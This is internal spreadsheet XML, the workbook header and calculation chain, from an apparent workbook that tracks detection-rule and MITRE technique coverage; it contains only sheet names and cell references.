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7"/>
  <workbookPr defaultThemeVersion="124226"/>
  <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
      <x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" url="C:\Users\maverick\Downloads\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{9C66A2CA-3EB3-4B43-8BD8-0BDF197FB5D7}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-108" yWindow="-108" windowWidth="23256" windowHeight="12456" xr2:uid="{00000000-000D-0000-FFFF-FFFF00000000}"/>
  </bookViews>
  <sheets>
    <sheet name="COVERAGE" sheetId="12" r:id="rId1"/>
    <sheet name="Detection Rules" sheetId="17" r:id="rId2"/>
    <sheet name="Mitre Techniques" sheetId="19" r:id="rId3"/>
    <sheet name="Data Sources" sheetId="9" r:id="rId4"/>
    <sheet name="legends" sheetId="21" r:id="rId5"/>
    <sheet name="Basic Progress" sheetId="23" r:id="rId6"/>
    <sheet name="Advanced Progress" sheetId="25" r:id="rId7"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="2" hidden="1">'Mitre Techniques'!$A$1:$X$657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27" i="19" l="1"/>
  <c r="F628" i="19"/>
  <c r="F629" i="19"/>
  <c r="F630" i="19"/>
  <c r="F631" i="19"/>
  <c r="F632" i="19"/>
  <c r="F633" i="19"/>
  <c r="F634" i="19"/>
  <c r="F635" i="19"/>
  <c r="F636" i="19"/>
  <c r="F637" i="19"/>
  <c r="F638" i="19"/>
  <c r="F639" i="19"/>
  <c r="F640" i="19"/>
  <c r="F641" i="19"/>
  <c r="F642" i="19"/>
  <c r="F643" i="19"/>
  <c r="F644" i="19"/>
  <c r="F645" i="19"/>
  <c r="F646" i="19"/>
  <c r="F647" i="19"/>
  <c r="F648" i="19"/>
  <c r="F649" i="19"/>
  <c r="F650" i="19"/>
  <c r="F651" i="19"/>
  <c r="F652" i="19"/>
  <c r="F653" i="19"/>
  <c r="F654" i="19"/>
  <c r="F655" i="19"/>
  <c r="F656" i="19"/>
  <c r="F657" i="19"/>
  <c r="G627" i="19" a="1"/>
  <c r="G627" i="19" s="1"/>
  <c r="G628" i="19" a="1"/>
  <c r="G628" i="19" s="1"/>
  <c r="G629" i="19" a="1"/>
  <c r="G629" i="19" s="1"/>
  <c r="G630" i="19" a="1"/>
  <c r="G630" i="19" s="1"/>
  <c r="G631" i="19" a="1"/>
  <c r="G631" i="19" s="1"/>
  <c r="G632" i="19" a="1"/>
  <c r="G632" i="19" s="1"/>
  <c r="G633" i="19" a="1"/>
  <c r="G633" i="19" s="1"/>
  <c r="G634" i="19" a="1"/>
  <c r="G634" i="19" s="1"/>
  <c r="G635" i="19" a="1"/>
  <c r="G635" i="19" s="1"/>
  <c r="G636" i="19" a="1"/>
  <c r="G636" i="19" s="1"/>
  <c r="G637" i="19" a="1"/>
  <c r="G637" i="19" s="1"/>
  <c r="G638" i="19" a="1"/>
  <c r="G638" i="19" s="1"/>
  <c r="G639" i="19" a="1"/>
  <c r="G639" i="19" s="1"/>
  <c r="G640" i="19" a="1"/>
  <c r="G640" i="19" s="1"/>
  <c r="G641" i="19" a="1"/>
  <c r="G641" i="19" s="1"/>
  <c r="G642" i="19" a="1"/>
  <c r="G642" i="19" s="1"/>
  <c r="G643" i="19" a="1"/>
  <c r="G643" i="19" s="1"/>
  <c r="G644" i="19" a="1"/>
  <c r="G644" i="19" s="1"/>
  <c r="G645" i="19" a="1"/>
  <c r="G645" i="19" s="1"/>
  <c r="G646" i="19" a="1"/>
  <c r="G646" i="19" s="1"/>
  <c r="G647" i="19" a="1"/>
  <c r="G647" i="19" s="1"/>
  <c r="G648" i="19" a="1"/>
  <c r="G648" i="19" s="1"/>
  <c r="G649" i="19" a="1"/>
  <c r="G649" i="19" s="1"/>
  <c r="G650" i="19" a="1"/>
  <c r="G650" i="19" s="1"/>
  <c r="G651" i="19" a="1"/>
  <c r="G651" i="19" s="1"/>
  <c r="G652" i="19" a="1"/>
  <c r="G652" i="19" s="1"/>
  <c r="G653" i="19" a="1"/>
  <c r="G653" i="19" s="1"/>
  <c r="G654" i="19" a="1"/>
  <c r="G654" i="19" s="1"/>
  <c r="G655" i="19" a="1"/>
  <c r="G655" i="19" s="1"/>
  <c r="G656" i="19" a="1"/>
  <c r="G656" i="19" s="1"/>
  <c r="G657" i="19" a="1"/>
  <c r="G657" i="19" s="1"/>
  <c r="H627" i="19" a="1"/>
  <c r="H627" i="19" s="1"/>
  <c r="J627" i="19" s="1" a="1"/>
  <c r="J627" i="19" s="1"/>
  <c r="H628" i="19" a="1"/>
  <c r="H628" i="19" s="1"/>
  <c r="J628" i="19" s="1" a="1"/>
  <c r="J628" i="19" s="1"/>
  <c r="H629" i="19" a="1"/>
  <c r="H629" i="19" s="1"/>
  <c r="J629" i="19" s="1" a="1"/>
  <c r="J629" i="19" s="1"/>
  <c r="H630" i="19" a="1"/>
  <c r="H630" i="19" s="1"/>
  <c r="J630" i="19" s="1" a="1"/>
  <c r="J630" i="19" s="1"/>
  <c r="H631" i="19" a="1"/>
  <c r="H631" i="19" s="1"/>
  <c r="J631" i="19" s="1" a="1"/>
  <c r="J631" i="19" s="1"/>
  <c r="H632" i="19" a="1"/>
  <c r="H632" i="19" s="1"/>
  <c r="J632" i="19" s="1" a="1"/>
  <c r="J632" i="19" s="1"/>
  <c r="H633" i="19" a="1"/>
  <c r="H633" i="19" s="1"/>
  <c r="J633" i="19" s="1" a="1"/>
  <c r="J633" i="19" s="1"/>
  <c r="H634" i="19" a="1"/>
  <c r="H634" i="19" s="1"/>
  <c r="J634" i="19" s="1" a="1"/>
  <c r="J634" i="19" s="1"/>
  <c r="H635" i="19" a="1"/>
  <c r="H635" i="19" s="1"/>
  <c r="J635" i="19" s="1" a="1"/>
  <c r="J635" i="19" s="1"/>
  <c r="H636" i="19" a="1"/>
  <c r="H636" i="19" s="1"/>
  <c r="J636" i="19" s="1" a="1"/>
  <c r="J636" i="19" s="1"/>
  <c r="H637" i="19" a="1"/>
  <c r="H637" i="19" s="1"/>
  <c r="J637" i="19" s="1" a="1"/>
  <c r="J637" i="19" s="1"/>
  <c r="H638" i="19" a="1"/>
  <c r="H638" i="19" s="1"/>
  <c r="H639" i="19" a="1"/>
  <c r="H639" i="19" s="1"/>
  <c r="J639" i="19" s="1" a="1"/>
  <c r="J639" i="19" s="1"/>
  <c r="H640" i="19" a="1"/>
  <c r="H640" i="19" s="1"/>
  <c r="J640" i="19" s="1" a="1"/>
  <c r="J640" i="19" s="1"/>
  <c r="H641" i="19" a="1"/>
  <c r="H641" i="19" s="1"/>
  <c r="J641" i="19" s="1" a="1"/>
  <c r="J641" i="19" s="1"/>
  <c r="H642" i="19" a="1"/>
  <c r="H642" i="19" s="1"/>
  <c r="J642" i="19" s="1" a="1"/>
  <c r="J642" i="19" s="1"/>
  <c r="H643" i="19" a="1"/>
  <c r="H643" i="19" s="1"/>
  <c r="J643" i="19" s="1" a="1"/>
  <c r="J643" i="19" s="1"/>
  <c r="H644" i="19" a="1"/>
  <c r="H644" i="19" s="1"/>
  <c r="J644" i="19" s="1" a="1"/>
  <c r="J644" i="19" s="1"/>
  <c r="H645" i="19" a="1"/>
  <c r="H645" i="19" s="1"/>
  <c r="J645" i="19" s="1" a="1"/>
  <c r="J645" i="19" s="1"/>
  <c r="H646" i="19" a="1"/>
  <c r="H646" i="19" s="1"/>
  <c r="J646" i="19" s="1" a="1"/>
  <c r="J646" i="19" s="1"/>
  <c r="H647" i="19" a="1"/>
  <c r="H647" i="19" s="1"/>
  <c r="J647" i="19" s="1" a="1"/>
  <c r="J647" i="19" s="1"/>
  <c r="H648" i="19" a="1"/>
  <c r="H648" i="19" s="1"/>
  <c r="J648" i="19" s="1" a="1"/>
  <c r="J648" i="19" s="1"/>
  <c r="H649" i="19" a="1"/>
  <c r="H649" i="19" s="1"/>
  <c r="J649" i="19" s="1" a="1"/>
  <c r="J649" i="19" s="1"/>
  <c r="H650" i="19" a="1"/>
  <c r="H650" i="19" s="1"/>
  <c r="J650" i="19" s="1" a="1"/>
  <c r="J650" i="19" s="1"/>
  <c r="H651" i="19" a="1"/>
  <c r="H651" i="19" s="1"/>
  <c r="J651" i="19" s="1" a="1"/>
  <c r="J651" i="19" s="1"/>
  <c r="H652" i="19" a="1"/>
  <c r="H652" i="19" s="1"/>
  <c r="J652" i="19" s="1" a="1"/>
  <c r="J652" i="19" s="1"/>
  <c r="H653" i="19" a="1"/>
  <c r="H653" i="19" s="1"/>
  <c r="J653" i="19" s="1" a="1"/>
  <c r="J653" i="19" s="1"/>
  <c r="H654" i="19" a="1"/>
  <c r="H654" i="19" s="1"/>
  <c r="J654" i="19" s="1" a="1"/>
  <c r="J654" i="19" s="1"/>
  <c r="H655" i="19" a="1"/>
  <c r="H655" i="19" s="1"/>
  <c r="J655" i="19" s="1" a="1"/>
  <c r="J655" i="19" s="1"/>
  <c r="H656" i="19" a="1"/>
  <c r="H656" i="19" s="1"/>
  <c r="J656" i="19" s="1" a="1"/>
  <c r="J656" i="19" s="1"/>
  <c r="H657" i="19" a="1"/>
  <c r="H657" i="19" s="1"/>
  <c r="I627" i="19" a="1"/>
  <c r="I627" i="19" s="1"/>
  <c r="I628" i="19" a="1"/>
  <c r="I628" i="19" s="1"/>
  <c r="I629" i="19" a="1"/>
  <c r="I629" i="19" s="1"/>
  <c r="I630" i="19" a="1"/>
  <c r="I630" i="19" s="1"/>
  <c r="I631" i="19" a="1"/>
  <c r="I631" i="19" s="1"/>
  <c r="I632" i="19" a="1"/>
  <c r="I632" i="19" s="1"/>
  <c r="I633" i="19" a="1"/>
  <c r="I633" i="19" s="1"/>
  <c r="I634" i="19" a="1"/>
  <c r="I634" i="19" s="1"/>
  <c r="I635" i="19" a="1"/>
  <c r="I635" i="19" s="1"/>
  <c r="I636" i="19" a="1"/>
  <c r="I636" i="19" s="1"/>
  <c r="I637" i="19" a="1"/>
  <c r="I637" i="19" s="1"/>
  <c r="I638" i="19" a="1"/>
  <c r="I638" i="19" s="1"/>
  <c r="I639" i="19" a="1"/>
  <c r="I639" i="19" s="1"/>
  <c r="I640" i="19" a="1"/>
  <c r="I640" i="19" s="1"/>
  <c r="I641" i="19" a="1"/>
  <c r="I641" i="19" s="1"/>
  <c r="I642" i="19" a="1"/>
  <c r="I642" i="19" s="1"/>
  <c r="I643" i="19" a="1"/>
  <c r="I643" i="19" s="1"/>
  <c r="I644" i="19" a="1"/>
  <c r="I644" i="19" s="1"/>
  <c r="I645" i="19" a="1"/>
  <c r="I645" i="19" s="1"/>
  <c r="I646" i="19" a="1"/>
  <c r="I646" i="19" s="1"/>
  <c r="I647" i="19" a="1"/>
  <c r="I647" i="19" s="1"/>
  <c r="I648" i="19" a="1"/>
  <c r="I648" i="19" s="1"/>
  <c r="I649" i="19" a="1"/>
  <c r="I649" i="19" s="1"/>
  <c r="I650" i="19" a="1"/>
  <c r="I650" i="19" s="1"/>
  <c r="I651" i="19" a="1"/>
  <c r="I651" i="19" s="1"/>
  <c r="I652" i="19" a="1"/>
  <c r="I652" i="19" s="1"/>
  <c r="I653" i="19" a="1"/>
  <c r="I653" i="19" s="1"/>
  <c r="I654" i="19" a="1"/>
  <c r="I654" i="19" s="1"/>
  <c r="I655" i="19" a="1"/>
  <c r="I655" i="19" s="1"/>
  <c r="I656" i="19" a="1"/>
  <c r="I656" i="19" s="1"/>
  <c r="I657" i="19" a="1"/>
  <c r="I657" i="19" s="1"/>
  <c r="K633" i="19"/>
  <c r="M633" i="19" s="1" a="1"/>
  <c r="M633" i="19" s="1"/>
  <c r="K641" i="19"/>
  <c r="M641" i="19" s="1" a="1"/>
  <c r="M641" i="19" s="1"/>
  <c r="P4" i="23"/>
  <c r="P3" i="23"/>
  <c r="P2" i="23"/>
  <c r="F539" i="19"/>
  <c r="K657" i="19" l="1"/>
  <c r="M657" i="19" s="1" a="1"/>
  <c r="M657" i="19" s="1"/>
  <c r="J657" i="19" a="1"/>
  <c r="J657" i="19" s="1"/>
  <c r="N657" i="19" s="1"/>
  <c r="K654" i="19"/>
  <c r="M654" i="19" s="1" a="1"/>
  <c r="M654" i="19" s="1"/>
  <c r="K653" i="19"/>
  <c r="M653" i="19" s="1" a="1"/>
  <c r="M653" i="19" s="1"/>
  <c r="K650" i="19"/>
  <c r="M650" i="19" s="1" a="1"/>
  <c r="M650" i="19" s="1"/>
  <c r="K649" i="19"/>
  <c r="M649" i="19" s="1" a="1"/>
  <c r="M649" i="19" s="1"/>
  <c r="K646" i="19"/>
  <c r="M646" i="19" s="1" a="1"/>
  <c r="M646" i="19" s="1"/>
  <c r="K645" i="19"/>
  <c r="M645" i="19" s="1" a="1"/>
  <c r="M645" i="19" s="1"/>
  <c r="K638" i="19"/>
  <c r="M638" i="19" s="1" a="1"/>
  <c r="M638" i="19" s="1"/>
  <c r="K637" i="19"/>
  <c r="M637" i="19" s="1" a="1"/>
  <c r="M637" i="19" s="1"/>
  <c r="K630" i="19"/>
  <c r="M630" i="19" s="1" a="1"/>
  <c r="M630" i="19" s="1"/>
  <c r="K629" i="19"/>
  <c r="M629" i="19" s="1" a="1"/>
  <c r="M629" i="19" s="1"/>
  <c r="N654" i="19"/>
  <c r="O654" i="19" s="1"/>
  <c r="N651" i="19"/>
  <c r="K651" i="19"/>
  <c r="M651" i="19" s="1" a="1"/>
  <c r="M651" i="19" s="1"/>
  <c r="N646" i="19"/>
  <c r="O646" i="19" s="1"/>
  <c r="K642" i="19"/>
  <c r="M642" i="19" s="1" a="1"/>
  <c r="M642" i="19" s="1"/>
  <c r="N635" i="19"/>
  <c r="K635" i="19"/>
  <c r="M635" i="19" s="1" a="1"/>
  <c r="M635" i="19" s="1"/>
  <c r="N645" i="19"/>
  <c r="N641" i="19"/>
  <c r="S641" i="19" s="1"/>
  <c r="N637" i="19"/>
  <c r="N630" i="19"/>
  <c r="O630" i="19" s="1"/>
  <c r="N629" i="19"/>
  <c r="N643" i="19"/>
  <c r="K643" i="19"/>
  <c r="M643" i="19" s="1" a="1"/>
  <c r="M643" i="19" s="1"/>
  <c r="K634" i="19"/>
  <c r="M634" i="19" s="1" a="1"/>
  <c r="M634" i="19" s="1"/>
  <c r="N634" i="19"/>
  <c r="N649" i="19"/>
  <c r="N642" i="19"/>
  <c r="N647" i="19"/>
  <c r="K647" i="19"/>
  <c r="M647" i="19" s="1" a="1"/>
  <c r="M647" i="19" s="1"/>
  <c r="K628" i="19"/>
  <c r="M628" i="19" s="1" a="1"/>
  <c r="M628" i="19" s="1"/>
  <c r="N628" i="19"/>
  <c r="K652" i="19"/>
  <c r="M652" i="19" s="1" a="1"/>
  <c r="M652" i="19" s="1"/>
  <c r="N652" i="19"/>
  <c r="N639" i="19"/>
  <c r="K639" i="19"/>
  <c r="M639" i="19" s="1" a="1"/>
  <c r="M639" i="19" s="1"/>
  <c r="N640" i="19"/>
  <c r="K640" i="19"/>
  <c r="M640" i="19" s="1" a="1"/>
  <c r="M640" i="19" s="1"/>
  <c r="N653" i="19"/>
  <c r="O653" i="19" s="1"/>
  <c r="N633" i="19"/>
  <c r="P633" i="19" s="1"/>
  <c r="N627" i="19"/>
  <c r="N632" i="19"/>
  <c r="K632" i="19"/>
  <c r="M632" i="19" s="1" a="1"/>
  <c r="M632" i="19" s="1"/>
  <c r="N631" i="19"/>
  <c r="K631" i="19"/>
  <c r="M631" i="19" s="1" a="1"/>
  <c r="M631" i="19" s="1"/>
  <c r="N656" i="19"/>
  <c r="K656" i="19"/>
  <c r="M656" i="19" s="1" a="1"/>
  <c r="M656" i="19" s="1"/>
  <c r="K644" i="19"/>
  <c r="M644" i="19" s="1" a="1"/>
  <c r="M644" i="19" s="1"/>
  <c r="N644" i="19"/>
  <c r="K627" i="19"/>
  <c r="M627" i="19" s="1" a="1"/>
  <c r="M627" i="19" s="1"/>
  <c r="N650" i="19"/>
  <c r="N655" i="19"/>
  <c r="K655" i="19"/>
  <c r="M655" i="19" s="1" a="1"/>
  <c r="M655" i="19" s="1"/>
  <c r="K636" i="19"/>
  <c r="M636" i="19" s="1" a="1"/>
  <c r="M636" i="19" s="1"/>
  <c r="N636" i="19"/>
  <c r="N648" i="19"/>
  <c r="K648" i="19"/>
  <c r="M648" i="19" s="1" a="1"/>
  <c r="M648" i="19" s="1"/>
  <c r="H206" i="19" a="1"/>
  <c r="H206" i="19" s="1"/>
  <c r="J206" i="19" s="1" a="1"/>
  <c r="J206" i="19" s="1"/>
  <c r="O650" i="19" l="1"/>
  <c r="O629" i="19"/>
  <c r="O637" i="19"/>
  <c r="O649" i="19"/>
  <c r="P629" i="19"/>
  <c r="S645" i="19"/>
  <c r="O657" i="19"/>
  <c r="P654" i="19"/>
  <c r="S629" i="19"/>
  <c r="P637" i="19"/>
  <c r="O642" i="19"/>
  <c r="S630" i="19"/>
  <c r="O636" i="19"/>
  <c r="P646" i="19"/>
  <c r="S646" i="19"/>
  <c r="P645" i="19"/>
  <c r="P642" i="19"/>
  <c r="O645" i="19"/>
  <c r="O634" i="19"/>
  <c r="S654" i="19"/>
  <c r="O641" i="19"/>
  <c r="P641" i="19"/>
  <c r="O651" i="19"/>
  <c r="P651" i="19"/>
  <c r="S651" i="19"/>
  <c r="S637" i="19"/>
  <c r="O632" i="19"/>
  <c r="S649" i="19"/>
  <c r="O643" i="19"/>
  <c r="P630" i="19"/>
  <c r="O635" i="19"/>
  <c r="P635" i="19"/>
  <c r="S635" i="19"/>
  <c r="O648" i="19"/>
  <c r="O652" i="19"/>
  <c r="S653" i="19"/>
  <c r="P643" i="19"/>
  <c r="O655" i="19"/>
  <c r="S643" i="19"/>
  <c r="O640" i="19"/>
  <c r="S642" i="19"/>
  <c r="P649" i="19"/>
  <c r="O656" i="19"/>
  <c r="O628" i="19"/>
  <c r="P657" i="19"/>
  <c r="O639" i="19"/>
  <c r="O647" i="19"/>
  <c r="O631" i="19"/>
  <c r="S639" i="19"/>
  <c r="P639" i="19"/>
  <c r="S632" i="19"/>
  <c r="P632" i="19"/>
  <c r="S628" i="19"/>
  <c r="P628" i="19"/>
  <c r="P640" i="19"/>
  <c r="S640" i="19"/>
  <c r="S652" i="19"/>
  <c r="P652" i="19"/>
  <c r="S647" i="19"/>
  <c r="P647" i="19"/>
  <c r="S631" i="19"/>
  <c r="P631" i="19"/>
  <c r="P627" i="19"/>
  <c r="S627" i="19"/>
  <c r="O627" i="19"/>
  <c r="P653" i="19"/>
  <c r="P634" i="19"/>
  <c r="S656" i="19"/>
  <c r="P656" i="19"/>
  <c r="S636" i="19"/>
  <c r="P636" i="19"/>
  <c r="P650" i="19"/>
  <c r="O633" i="19"/>
  <c r="S633" i="19"/>
  <c r="S634" i="19"/>
  <c r="S644" i="19"/>
  <c r="P644" i="19"/>
  <c r="P648" i="19"/>
  <c r="S648" i="19"/>
  <c r="P655" i="19"/>
  <c r="S655" i="19"/>
  <c r="O644" i="19"/>
  <c r="S650" i="19"/>
  <c r="S657" i="19"/>
  <c r="I2" i="19" a="1"/>
  <c r="I2" i="19" s="1"/>
  <c r="I366" i="19" a="1"/>
  <c r="I366" i="19" s="1"/>
  <c r="I368" i="19" a="1"/>
  <c r="I368" i="19" s="1"/>
  <c r="I365" i="19" a="1"/>
  <c r="I365" i="19" s="1"/>
  <c r="I367" i="19" a="1"/>
  <c r="I367" i="19" s="1"/>
  <c r="I369" i="19" a="1"/>
  <c r="I369" i="19" s="1"/>
  <c r="I6" i="19" a="1"/>
  <c r="I6" i="19" s="1"/>
  <c r="I205" i="19" a="1"/>
  <c r="I205" i="19" s="1"/>
  <c r="I206" i="19" a="1"/>
  <c r="I206" i="19" s="1"/>
  <c r="I207" i="19" a="1"/>
  <c r="I207" i="19" s="1"/>
  <c r="I208" i="19" a="1"/>
  <c r="I208" i="19" s="1"/>
  <c r="I204" i="19" a="1"/>
  <c r="I204" i="19" s="1"/>
  <c r="I15" i="19" a="1"/>
  <c r="I15" i="19" s="1"/>
  <c r="I16" i="19" a="1"/>
  <c r="I16" i="19" s="1"/>
  <c r="I155" i="19" a="1"/>
  <c r="I155" i="19" s="1"/>
  <c r="I153" i="19" a="1"/>
  <c r="I153" i="19" s="1"/>
  <c r="I154" i="19" a="1"/>
  <c r="I154" i="19" s="1"/>
  <c r="I152" i="19" a="1"/>
  <c r="I152" i="19" s="1"/>
  <c r="I17" i="19" a="1"/>
  <c r="I17" i="19" s="1"/>
  <c r="I165" i="19" a="1"/>
  <c r="I165" i="19" s="1"/>
  <c r="I167" i="19" a="1"/>
  <c r="I167" i="19" s="1"/>
  <c r="I170" i="19" a="1"/>
  <c r="I170" i="19" s="1"/>
  <c r="I166" i="19" a="1"/>
  <c r="I166" i="19" s="1"/>
  <c r="I169" i="19" a="1"/>
  <c r="I169" i="19" s="1"/>
  <c r="I168" i="19" a="1"/>
  <c r="I168" i="19" s="1"/>
  <c r="I18" i="19" a="1"/>
  <c r="I18" i="19" s="1"/>
  <c r="I19" i="19" a="1"/>
  <c r="I19" i="19" s="1"/>
  <c r="I507" i="19" a="1"/>
  <c r="I507" i="19" s="1"/>
  <c r="I504" i="19" a="1"/>
  <c r="I504" i="19" s="1"/>
  <c r="I503" i="19" a="1"/>
  <c r="I503" i="19" s="1"/>
  <c r="I510" i="19" a="1"/>
  <c r="I510" i="19" s="1"/>
  <c r="I506" i="19" a="1"/>
  <c r="I506" i="19" s="1"/>
  <c r="I509" i="19" a="1"/>
  <c r="I509" i="19" s="1"/>
  <c r="I505" i="19" a="1"/>
  <c r="I505" i="19" s="1"/>
  <c r="I508" i="19" a="1"/>
  <c r="I508" i="19" s="1"/>
  <c r="I20" i="19" a="1"/>
  <c r="I20" i="19" s="1"/>
  <c r="I566" i="19" a="1"/>
  <c r="I566" i="19" s="1"/>
  <c r="I567" i="19" a="1"/>
  <c r="I567" i="19" s="1"/>
  <c r="I568" i="19" a="1"/>
  <c r="I568" i="19" s="1"/>
  <c r="I22" i="19" a="1"/>
  <c r="I22" i="19" s="1"/>
  <c r="I410" i="19" a="1"/>
  <c r="I410" i="19" s="1"/>
  <c r="I411" i="19" a="1"/>
  <c r="I411" i="19" s="1"/>
  <c r="I409" i="19" a="1"/>
  <c r="I409" i="19" s="1"/>
  <c r="I23" i="19" a="1"/>
  <c r="I23" i="19" s="1"/>
  <c r="I138" i="19" a="1"/>
  <c r="I138" i="19" s="1"/>
  <c r="I136" i="19" a="1"/>
  <c r="I136" i="19" s="1"/>
  <c r="I137" i="19" a="1"/>
  <c r="I137" i="19" s="1"/>
  <c r="I135" i="19" a="1"/>
  <c r="I135" i="19" s="1"/>
  <c r="I24" i="19" a="1"/>
  <c r="I24" i="19" s="1"/>
  <c r="I27" i="19" a="1"/>
  <c r="I27" i="19" s="1"/>
  <c r="I424" i="19" a="1"/>
  <c r="I424" i="19" s="1"/>
  <c r="I423" i="19" a="1"/>
  <c r="I423" i="19" s="1"/>
  <c r="I422" i="19" a="1"/>
  <c r="I422" i="19" s="1"/>
  <c r="I28" i="19" a="1"/>
  <c r="I28" i="19" s="1"/>
  <c r="I30" i="19" a="1"/>
  <c r="I30" i="19" s="1"/>
  <c r="I39" i="19" a="1"/>
  <c r="I39" i="19" s="1"/>
  <c r="I29" i="19" a="1"/>
  <c r="I29" i="19" s="1"/>
  <c r="I40" i="19" a="1"/>
  <c r="I40" i="19" s="1"/>
  <c r="I53" i="19" a="1"/>
  <c r="I53" i="19" s="1"/>
  <c r="I362" i="19" a="1"/>
  <c r="I362" i="19" s="1"/>
  <c r="I351" i="19" a="1"/>
  <c r="I351" i="19" s="1"/>
  <c r="I355" i="19" a="1"/>
  <c r="I355" i="19" s="1"/>
  <c r="I357" i="19" a="1"/>
  <c r="I357" i="19" s="1"/>
  <c r="I363" i="19" a="1"/>
  <c r="I363" i="19" s="1"/>
  <c r="I359" i="19" a="1"/>
  <c r="I359" i="19" s="1"/>
  <c r="I360" i="19" a="1"/>
  <c r="I360" i="19" s="1"/>
  <c r="I356" i="19" a="1"/>
  <c r="I356" i="19" s="1"/>
  <c r="I350" i="19" a="1"/>
  <c r="I350" i="19" s="1"/>
  <c r="I354" i="19" a="1"/>
  <c r="I354" i="19" s="1"/>
  <c r="I358" i="19" a="1"/>
  <c r="I358" i="19" s="1"/>
  <c r="I352" i="19" a="1"/>
  <c r="I352" i="19" s="1"/>
  <c r="I353" i="19" a="1"/>
  <c r="I353" i="19" s="1"/>
  <c r="I361" i="19" a="1"/>
  <c r="I361" i="19" s="1"/>
  <c r="I54" i="19" a="1"/>
  <c r="I54" i="19" s="1"/>
  <c r="I68" i="19" a="1"/>
  <c r="I68" i="19" s="1"/>
  <c r="I67" i="19" a="1"/>
  <c r="I67" i="19" s="1"/>
  <c r="I69" i="19" a="1"/>
  <c r="I69" i="19" s="1"/>
  <c r="I70" i="19" a="1"/>
  <c r="I70" i="19" s="1"/>
  <c r="I71" i="19" a="1"/>
  <c r="I71" i="19" s="1"/>
  <c r="I55" i="19" a="1"/>
  <c r="I55" i="19" s="1"/>
  <c r="I56" i="19" a="1"/>
  <c r="I56" i="19" s="1"/>
  <c r="I66" i="19" a="1"/>
  <c r="I66" i="19" s="1"/>
  <c r="I72" i="19" a="1"/>
  <c r="I72" i="19" s="1"/>
  <c r="I182" i="19" a="1"/>
  <c r="I182" i="19" s="1"/>
  <c r="I180" i="19" a="1"/>
  <c r="I180" i="19" s="1"/>
  <c r="I179" i="19" a="1"/>
  <c r="I179" i="19" s="1"/>
  <c r="I181" i="19" a="1"/>
  <c r="I181" i="19" s="1"/>
  <c r="I73" i="19" a="1"/>
  <c r="I73" i="19" s="1"/>
  <c r="I74" i="19" a="1"/>
  <c r="I74" i="19" s="1"/>
  <c r="I75" i="19" a="1"/>
  <c r="I75" i="19" s="1"/>
  <c r="I76" i="19" a="1"/>
  <c r="I76" i="19" s="1"/>
  <c r="I77" i="19" a="1"/>
  <c r="I77" i="19" s="1"/>
  <c r="I81" i="19" a="1"/>
  <c r="I81" i="19" s="1"/>
  <c r="I82" i="19" a="1"/>
  <c r="I82" i="19" s="1"/>
  <c r="I84" i="19" a="1"/>
  <c r="I84" i="19" s="1"/>
  <c r="I111" i="19" a="1"/>
  <c r="I111" i="19" s="1"/>
  <c r="I118" i="19" a="1"/>
  <c r="I118" i="19" s="1"/>
  <c r="I116" i="19" a="1"/>
  <c r="I116" i="19" s="1"/>
  <c r="I117" i="19" a="1"/>
  <c r="I117" i="19" s="1"/>
  <c r="I110" i="19" a="1"/>
  <c r="I110" i="19" s="1"/>
  <c r="I115" i="19" a="1"/>
  <c r="I115" i="19" s="1"/>
  <c r="I113" i="19" a="1"/>
  <c r="I113" i="19" s="1"/>
  <c r="I114" i="19" a="1"/>
  <c r="I114" i="19" s="1"/>
  <c r="I112" i="19" a="1"/>
  <c r="I112" i="19" s="1"/>
  <c r="I90" i="19" a="1"/>
  <c r="I90" i="19" s="1"/>
  <c r="I103" i="19" a="1"/>
  <c r="I103" i="19" s="1"/>
  <c r="I526" i="19" a="1"/>
  <c r="I526" i="19" s="1"/>
  <c r="I525" i="19" a="1"/>
  <c r="I525" i="19" s="1"/>
  <c r="I524" i="19" a="1"/>
  <c r="I524" i="19" s="1"/>
  <c r="I108" i="19" a="1"/>
  <c r="I108" i="19" s="1"/>
  <c r="I109" i="19" a="1"/>
  <c r="I109" i="19" s="1"/>
  <c r="I516" i="19" a="1"/>
  <c r="I516" i="19" s="1"/>
  <c r="I513" i="19" a="1"/>
  <c r="I513" i="19" s="1"/>
  <c r="I512" i="19" a="1"/>
  <c r="I512" i="19" s="1"/>
  <c r="I515" i="19" a="1"/>
  <c r="I515" i="19" s="1"/>
  <c r="I518" i="19" a="1"/>
  <c r="I518" i="19" s="1"/>
  <c r="I514" i="19" a="1"/>
  <c r="I514" i="19" s="1"/>
  <c r="I517" i="19" a="1"/>
  <c r="I517" i="19" s="1"/>
  <c r="I119" i="19" a="1"/>
  <c r="I119" i="19" s="1"/>
  <c r="I120" i="19" a="1"/>
  <c r="I120" i="19" s="1"/>
  <c r="I124" i="19" a="1"/>
  <c r="I124" i="19" s="1"/>
  <c r="I134" i="19" a="1"/>
  <c r="I134" i="19" s="1"/>
  <c r="I213" i="19" a="1"/>
  <c r="I213" i="19" s="1"/>
  <c r="I212" i="19" a="1"/>
  <c r="I212" i="19" s="1"/>
  <c r="I211" i="19" a="1"/>
  <c r="I211" i="19" s="1"/>
  <c r="I139" i="19" a="1"/>
  <c r="I139" i="19" s="1"/>
  <c r="I328" i="19" a="1"/>
  <c r="I328" i="19" s="1"/>
  <c r="I331" i="19" a="1"/>
  <c r="I331" i="19" s="1"/>
  <c r="I329" i="19" a="1"/>
  <c r="I329" i="19" s="1"/>
  <c r="I330" i="19" a="1"/>
  <c r="I330" i="19" s="1"/>
  <c r="I140" i="19" a="1"/>
  <c r="I140" i="19" s="1"/>
  <c r="I398" i="19" a="1"/>
  <c r="I398" i="19" s="1"/>
  <c r="I395" i="19" a="1"/>
  <c r="I395" i="19" s="1"/>
  <c r="I393" i="19" a="1"/>
  <c r="I393" i="19" s="1"/>
  <c r="I397" i="19" a="1"/>
  <c r="I397" i="19" s="1"/>
  <c r="I394" i="19" a="1"/>
  <c r="I394" i="19" s="1"/>
  <c r="I396" i="19" a="1"/>
  <c r="I396" i="19" s="1"/>
  <c r="I143" i="19" a="1"/>
  <c r="I143" i="19" s="1"/>
  <c r="I148" i="19" a="1"/>
  <c r="I148" i="19" s="1"/>
